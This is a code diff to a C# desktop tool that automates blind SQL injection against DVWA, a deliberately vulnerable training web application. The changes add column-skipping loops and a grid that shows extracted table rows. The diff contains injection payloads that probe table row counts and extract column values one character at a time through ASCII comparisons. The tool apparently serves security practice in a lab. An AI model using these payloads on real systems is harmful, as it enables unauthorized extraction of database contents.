@@ -223,6 +223,7 @@ namespace Tool_SqlInjectionBlind_Dvwa
                         else
                         {
                             Variable.Index_Columns++;
+
                             if(Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
                             {
                                 Variable.Index_Columns = 0;
@@ -231,6 +232,35 @@ namespace Tool_SqlInjectionBlind_Dvwa
                                 {
                                     Variable.Index_Rows = 0;
                                     Variable.Index_Tables++;
+                                }
+                            }
+                            else
+                            {
+                                while (true)
+                                {
+                                    if (Variable.Index_Tables >= Variable.Quantity_Tables)
+                                    {
+                                        return;
+                                    }
+                                    else
+                                    {
+                                        if (Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
+                                        {
+                                            Variable.Index_Columns = 0;
+                                            Variable.Index_Rows++;
+                                            if (Variable.Index_Rows >= Variable.Quantity_Row[Variable.Index_Tables])
+                                            {
+                                                Variable.Index_Rows = 0;
+                                                Variable.Index_Tables++;
+                                            }
+                                        }
+                                        else if (!clb_ColsName.GetItemChecked(clb_ColsName.Items.IndexOf(Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns])))
+                                        {
+                                            Variable.Index_Columns++;
+                                        }
+                                        else
+                                            break;
+                                    }
                                 }
                             }
 
@@ -266,6 +296,29 @@ namespace Tool_SqlInjectionBlind_Dvwa
                     {
                         Variable.Bd_DataTable[Variable.Index_Tables][Variable.Index_Rows][Variable.Index_Columns] += str_result;
                         sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.DATA_TABLE, ref index);
+
+                        DataTable d_table = new DataTable(cmb_Tables.Text);
+                        DataColumn d_col;
+                        DataRow d_row;
+
+                        for(int col = 0; col < Variable.Quantity_Columns[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)]; col++)
+                        {
+                            d_col = new DataColumn(Variable.Db_ColumnsName[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][col]);
+                            d_table.Columns.Add(d_col);
+                        }
+
+                        for(int row = 0; row < Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)].Count; row++)
+                        {
+                            d_row = d_table.NewRow();
+                            for (int col = 0; col < Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][row].Count; col++)
+                            {
+                                d_row[col] = Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][row][col];
+                            }
+                            d_table.Rows.Add(d_row);
+                        }
+
+                        dgv_Data.DataSource = d_table;
+                        
                     }
                     
 
@@ -475,6 +528,35 @@ namespace Tool_SqlInjectionBlind_Dvwa
                             }
                             Variable.Index_Columns = Variable.Index_Rows = Variable.Index_Tables = 0;
                         }
+
+                        while (true)
+                        {
+                            if (Variable.Index_Tables >= Variable.Quantity_Tables)
+                            {
+                                List<List<List<string>>> a = Variable.Bd_DataTable;
+                                return;
+                            }
+                            else
+                            {
+                                if (Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
+                                {
+                                    Variable.Index_Columns = 0;
+                                    Variable.Index_Rows++;
+                                    if (Variable.Index_Rows >= Variable.Quantity_Row[Variable.Index_Tables])
+                                    {
+                                        Variable.Index_Rows = 0;
+                                        Variable.Index_Tables++;
+                                    }
+                                }
+                                else if (!clb_ColsName.GetItemChecked(clb_ColsName.Items.IndexOf(Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns])))
+                                {
+                                    Variable.Index_Columns++;
+                                }
+                                else
+                                    break;
+                            }
+                        }
+
                         sql = "1' AND ascii(lower(substring((SELECT " + Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns] + " from dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + " LIMIT 0, 1), 0, 1))) >= 127 #";
                         if (Variable.Index_Tables < Variable.Quantity_Tables)
                         {
@@ -493,39 +575,39 @@ namespace Tool_SqlInjectionBlind_Dvwa
                             }
 
                         }
-                        else //count quantity don't complete
+                    }
+                    else //count quantity don't complete
+                    {
+                        if (Confirm.Find_Quantity_Row_Done.Count == 0)
                         {
-                            if (Confirm.Find_Quantity_Row_Done.Count == 0)
+                            for (int run = 0; run < Variable.Quantity_Tables; run++)
                             {
-                                for (int run = 0; run < Variable.Quantity_Tables; run++)
-                                {
-                                    Confirm.Find_Quantity_Row_Done.Add(false);
-                                    Variable.Quantity_Row.Add(0);
-                                }
-                                Variable.Index_Tables = 0;
-                                str_result = "";
-                                sql = "1' AND (SELECT COUNT(*) FROM dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + ") >= 127 #";
-
-                                PutData(sql);
+                                Confirm.Find_Quantity_Row_Done.Add(false);
+                                Variable.Quantity_Row.Add(0);
                             }
-                            else
+                            Variable.Index_Tables = 0;
+                            str_result = "";
+                            sql = "1' AND (SELECT COUNT(*) FROM dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + ") >= 127 #";
+
+                            PutData(sql);
+                        }
+                        else
+                        {
+
+                            for (int run = 0; run < Confirm.Find_Quantity_Row_Done.Count; run++)
                             {
-
-                                for (int run = 0; run < Confirm.Find_Quantity_Row_Done.Count; run++)
+                                if (Confirm.Find_Quantity_Row_Done[run] == false)
                                 {
-                                    if (Confirm.Find_Quantity_Row_Done[run] == false)
-                                    {
-                                        Variable.Index_Tables = run;
-                                        break;
-                                    }
+                                    Variable.Index_Tables = run;
+                                    break;
                                 }
-                                //count row
-                                str_result = "";
-                                sql = "1' AND (SELECT COUNT(*) FROM dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + ") >= 127 #";
-
-                                PutData(sql);
-
                             }
+                            //count row
+                            str_result = "";
+                            sql = "1' AND (SELECT COUNT(*) FROM dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + ") >= 127 #";
+
+                            PutData(sql);
+
                         }
                     }
                 }
